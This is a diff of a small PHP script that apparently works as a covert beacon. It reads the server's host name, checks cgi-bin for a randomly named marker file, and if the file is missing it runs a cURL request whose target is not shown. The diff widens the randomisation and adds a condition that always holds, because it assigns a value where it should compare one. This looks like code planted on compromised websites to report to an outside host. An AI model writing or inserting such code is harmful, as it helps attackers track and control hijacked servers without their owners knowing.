@@ -1,5 +1,7 @@
 <?php 
-$random = rand(1,2);
+$random2 = rand(1,3);
+if($random2=1) {
+$random = rand(1,6);
 $rand="ded";
 $d=$_SERVER['SERVER_NAME'];
 if(filesize($_SERVER['DOCUMENT_ROOT']."/cgi-bin/".$random.$rand)) { } else {
@@ -13,4 +15,4 @@ if(filesize($_SERVER['DOCUMENT_ROOT']."/cgi-bin/".$random.$rand)) { } else {
 ]);
  $resp3 = curl_exec($curl3);
  curl_close($curl3);	
-} ?>
+}} ?>
